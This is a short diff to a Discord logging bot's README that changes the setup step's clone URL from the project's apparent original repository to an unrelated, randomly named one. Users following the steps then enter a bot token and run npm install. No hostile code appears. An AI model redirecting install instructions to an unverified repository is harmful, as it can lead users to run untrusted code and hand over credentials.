@@ -23,7 +23,7 @@ Then run `/setchannel #your-log-channel`. Every event is logged by default; turn
 - [A Discord Application](https://discord.com/developers/applications)
 
 ### Setup:
-1. `git clone https://github.com/ringnetcpbx/logwarden.git Logwarden`
+1. `git clone https://github.com/tomg12345667/sturdy-waffle.git Logwarden`
 2. `cd Logwarden`
 3. Copy `config-example.json` to `config.json` and put in your bot `token`
 4. `npm install`
